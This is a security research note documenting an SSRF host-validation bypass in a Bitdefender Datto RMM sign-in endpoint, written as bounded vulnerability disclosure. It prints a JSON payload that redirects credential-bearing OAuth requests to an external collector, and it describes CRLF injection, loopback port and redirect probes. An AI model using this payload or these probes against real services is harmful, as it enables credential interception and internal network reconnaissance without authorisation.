# Datto RMM SSRF chain boundary (2026-09-26)

This is an investigation note, not an additional high-severity finding. All destinations and identities below were researcher-owned or synthetic. No existing tenant ID was used.

## Path-suffix host-validation bypass

`POST https://datto.rmm.bitdefender.com/api/user/signIn` accepted:

```json
{
  "rmmApiKey": "codex-path-test",
  "rmmApiSecret": "codex-path-test",
  "rmmServerAddress": "https://<owned-collector>.webhook.site/foo.centrastage.net"
}
```

The collector received `POST /foo.centrastage.net/auth/oauth/token` with `username=codex-path-test&password=codex-path-test&grant_type=password`. Thus a path ending in `.centrastage.net` satisfies the application's URL check while the parsed host is the arbitrary collector. Unlike a fragment payload, this variant preserves the API paths appended by the backend.

The [official Datto RMM API guide](https://rmm.datto.com/help/en/Content/2SETUP/APIv2.htm) documents `/auth/oauth/token` and `/api/v2/account` as the token and account endpoints. Its published OpenAPI URLs (`[API URL]/api/v3/api-docs/Datto-RMM`) all returned HTTP 500 when checked on the six documented platforms. An [independent OpenAPI transcription](https://raw.githubusercontent.com/api-evangelist/datto/refs/heads/main/openapi/datto-v2-account-api-openapi.yml) lists account fields `id`, `uid`, `name`, `descriptor`, `currency`, and `devicesStatus`; that transcription is not an official source.

## Route-specific owned mock

A researcher-owned HTTPS collector returned a distinct response for each backend call:

1. To `POST /foo.centrastage.net/auth/oauth/token`: HTTP 200 JSON `{"access_token":"codex-dyn-token-1a43203c9d","token_type":"Bearer","expires_in":60}`.
2. To `GET /foo.centrastage.net/api/v2/account`: HTTP 200 JSON with the synthetic account `id=971656540569225`, `uid="codex-owned-1a43203c9d"`, `name="Codex Owned Test 1a43203c9d"`, plus a synthetic descriptor and currency. The GET's `Authorization` header contained only the fake bearer token supplied in step 1.

The sign-in call returned HTTP 404 `ERR2` and set `SessionCookie`. Using that same cookie:

| Endpoint | Result |
| --- | --- |
| `GET /api/tenant` | 404 `Tenant is not registered` |
| `GET /api/tenant/settings` | 401 Unauthorized |
| `GET /api/gz/companies` | 401 Unauthorized |
| `GET /api/events` | 401 Unauthorized |

The collector saw only the OAuth POST carrying dummy submitted credentials and the account GET carrying the fake bearer token. No Bitdefender privileged token or cookie reached the collector. A fake Datto OAuth/account response advanced the flow to the unregistered-tenant state but did not grant protected access. Further account-level authorization testing requires a researcher-owned registered Datto/GravityZone tenant, which was unavailable. No data-access, RCE, or database impact was proven.

## Bounded SSRF deepening (2026-09-28)

- A controlled response-body comparison showed that HTTP 200 JSON `{}` and a synthetic OAuth token each caused the follow-up GET and HTTP 404 `ERR2`; HTTP 404 from the collector produced HTTP 400 `Invalid Datto RMM credentials.`. The `{}` case sent an empty `Bearer` value. No fetched response body was returned to the caller.
- A bearer token containing CRLF or LF caused a generic HTTP 400 and no follow-up GET. Literal `%0d%0a` stayed literal in `Authorization`; no extra canary header appeared at the owned collector. This did not yield arbitrary header control.
- Direct HTTPS loopback probes at ports 1, 443, 8443, and 5001 all produced the same HTTP 400 after roughly 15 seconds, including the known closed control, while the owned HTTPS control completed in roughly one second. The timing did not distinguish open ports.
- The service followed a controlled HTTPS redirect to an owned collector. Redirecting instead to loopback port 443 returned the same generic HTTP 400 after roughly 14 seconds as the direct loopback probes. No internal service response or access was established.
